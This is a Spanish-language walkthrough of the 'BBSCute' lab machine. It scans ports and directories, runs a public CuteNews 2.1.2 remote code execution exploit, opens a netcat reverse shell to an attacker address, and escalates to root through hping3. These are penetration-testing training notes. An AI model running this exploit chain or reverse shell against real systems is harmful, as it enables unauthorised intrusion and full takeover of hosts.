# BBSCute

## Reconocimiento

Escanear todos los puertos abiertos

```shell
> nmap -p- --open --min-rate 5000 -vvv -n -Pn 192.168.217.128

PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack
80/tcp  open  http         syn-ack
88/tcp  open  kerberos-sec syn-ack
110/tcp open  pop3         syn-ack
995/tcp open  pop3s        syn-ack
```

Escanear versiones de los puertos abiertos

```shell
> nmap -sCV -p22,80,88,110,995 192.168.217.128

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 04:d0:6e:c4:ba:4a:31:5a:6f:b3:ee:b8:1b:ed:5a:b7 (RSA)
|   256 24:b3:df:01:0b:ca:c2:ab:2e:e9:49:b0:58:08:6a:fa (ECDSA)
|_  256 6a:c4:35:6a:7a:1e:7e:51:85:5b:81:5c:7c:74:49:84 (ED25519)
80/tcp  open  http     Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
88/tcp  open  http     nginx 1.14.2
|_http-title: 404 Not Found
|_http-server-header: nginx/1.14.2
110/tcp open  pop3     Courier pop3d
|_pop3-capabilities: USER IMPLEMENTATION(Courier Mail Server) LOGIN-DELAY(10) UTF8(USER) TOP STLS PIPELINING UIDL
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-09-17T16:28:06
|_Not valid after:  2021-09-17T16:28:06
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3 Courier pop3d
|_pop3-capabilities: USER IMPLEMENTATION(Courier Mail Server) LOGIN-DELAY(10) TOP UIDL PIPELINING UTF8(USER)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-09-17T16:28:06
|_Not valid after:  2021-09-17T16:28:06
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Puerto 80 (http)

<figure><img src="../../../.gitbook/assets/Pasted image 20230327013207.png" alt=""><figcaption></figcaption></figure>

Vemos que no hay nada interesante, pues vamos a buscar directorios

```shell
> sudo gobuster dir -u http://192.168.217.128/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x .php

/rss.php              (Status: 200) [Size: 105]
/print.php            (Status: 200) [Size: 28] 
/uploads              (Status: 301) [Size: 320] [--> http://192.168.217.128/uploads/]
/skins                (Status: 301) [Size: 318] [--> http://192.168.217.128/skins/]  
/index.php            (Status: 200) [Size: 6175]                                     
/core                 (Status: 301) [Size: 317] [--> http://192.168.217.128/core/]   
/manual               (Status: 301) [Size: 319] [--> http://192.168.217.128/manual/] 
/popup.php            (Status: 200) [Size: 28]                                       
/search.php           (Status: 200) [Size: 5182]                                     
/docs                 (Status: 301) [Size: 317] [--> http://192.168.217.128/docs/]   
/captcha.php          (Status: 200) [Size: 91]                                       
/example.php          (Status: 200) [Size: 9522]                                     
/libs                 (Status: 301) [Size: 317] [--> http://192.168.217.128/libs/]   
/snippet.php          (Status: 200) [Size: 0]                                        
/show_news.php        (Status: 200) [Size: 2987]                                     
/cdata                (Status: 301) [Size: 318] [--> http://192.168.217.128/cdata/]  
/server-status        (Status: 403) [Size: 280]                                      
/show_archives.php    (Status: 200) [Size: 0]                                        
```

Vemos que encontramos un archivo index.php

<figure><img src="../../../.gitbook/assets/Pasted image 20230327013233.png" alt=""><figcaption></figcaption></figure>

## Explotacion

Buscamos vulnerabilidades con searchsploit associadas a cutenews 2.1.2

```shell
> searchsploit CuteNews 2.1.2
-------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                            |  Path
-------------------------------------------------------------------------- ---------------------------------
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)              | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                                  | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload                      | php/webapps/48458.txt
CuteNews 2.1.2 - Remote Code Execution                                    | php/webapps/48800.py
-------------------------------------------------------------------------- ---------------------------------

# Encontramos uno que se llama CuteNews 2.1.2 - Remote Code Execution vamos a probarlo
searchsploit -m php/webapps/48800.py

python3 exploit.py # Iniciamos el exploit

[->] Usage python3 expoit.py

Enter the URL> http://192.168.217.128 # Si no funciona dentro del exploit hay varias veces que sale la ruta del payload $ip/CuteNews/ hay que quitarlo porque como ese directorio no existe
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
[-] No hashes were found skipping!!!
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: 6OdPtNDgdd and password: 6OdPtNDgdd

=======================================================
Sending Payload
=======================================================
signature_key: 684894bfc00e3b5197e858cb6767f018-6OdPtNDgdd
signature_dsi: 3b67b58517a2c306a99d691750af5dec
logged in user: 6OdPtNDgdd
============================
Dropping to a SHELL
============================

command > nc -e /bin/bash 192.168.45.5 4444
```

* Hacemos una reverse shell con nc

```shell
> nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.5] from (UNKNOWN) [192.168.217.128] 35446

www-data@cute:/var/www/html/uploads$ 
```

## Escalada de Privilegios

```shell
www-data@cute:/$ hping3
hping3> /bin/sh -p
# whoami
root
```
